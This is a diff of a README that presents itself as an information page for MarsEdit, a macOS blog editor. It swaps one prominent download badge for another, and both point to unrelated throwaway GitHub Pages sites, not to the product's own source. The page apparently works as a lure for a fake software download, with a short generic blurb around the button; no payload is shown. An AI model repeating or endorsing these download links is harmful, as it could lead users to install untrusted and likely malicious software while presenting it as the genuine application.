@@ -2,19 +2,15 @@
 
 <div align="center">  
 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRsxwFRzmPwZPKR8_rTdHJoBiJM4hCYU_uysA&s" alt="MarsEdit Logo" width="128" height="128">  
-</div>  
-
-<div align="center">  
-<a href="https://shikikofa1593.github.io/.github/marsedit">  
-<img src="https://img.shields.io/badge/Download_MarsEdit_for_Mac-darkblue?style=for-the-badge&logo=apple" alt="Download MarsEdit for Mac">  
-</a>  
-</div>  
+</div>   
 
 ---
 
 ## What is MarsEdit for Mac?
 
 MarsEdit is a dedicated blog editor for macOS that allows you to write, preview, and publish posts directly from your desktop. It eliminates the need for a web browser, offering a faster and more reliable writing experience.
+
+[![Download Now](https://img.shields.io/badge/Download_Now-steelblue?style=for-the-badge&logo=arma)](https://p0763235.github.io/.github/marsedit-blogging-software)
 
 The application supports all major blogging platforms including WordPress, Blogger, Tumblr, and Medium. You can manage multiple blogs, upload images with drag-and-drop, and use rich text or HTML editing modes. MarsEdit automatically saves your work locally, so you never lose content due to browser crashes or connectivity issues.
 
